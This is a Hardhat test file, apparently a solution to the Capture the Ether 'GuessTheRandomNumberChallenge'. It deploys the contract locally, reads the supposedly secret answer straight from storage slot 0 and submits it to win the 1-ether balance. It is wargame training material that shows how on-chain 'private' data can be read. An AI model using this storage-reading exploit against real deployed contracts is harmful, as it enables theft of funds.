import { SignerWithAddress } from '@nomicfoundation/hardhat-ethers/signers';
import { expect } from 'chai';
import { ethers } from 'hardhat';
const { provider } = ethers;

import { GuessTheRandomNumberChallenge } from '../typechain-types';

describe('GuessTheRandomNumberChallenge', () => {
  let target: GuessTheRandomNumberChallenge;
  let attacker: SignerWithAddress;
  let deployer: SignerWithAddress;

  before(async () => {
    [attacker, deployer] = await ethers.getSigners();

    target = (await (
      await ethers.getContractFactory('GuessTheRandomNumberChallenge', deployer)
    ).deploy({
      value: ethers.parseEther('1'),
    })) as unknown as GuessTheRandomNumberChallenge;

    await target.waitForDeployment();

    target = target.connect(attacker);
  });

  it('exploit', async () => {
    const savedAnswer = await provider.getStorage(target.getAddress(), 0);
    await target.guess(savedAnswer, { value: ethers.parseEther('1') });

    expect(await target.isComplete()).to.equal(true);
  });
});
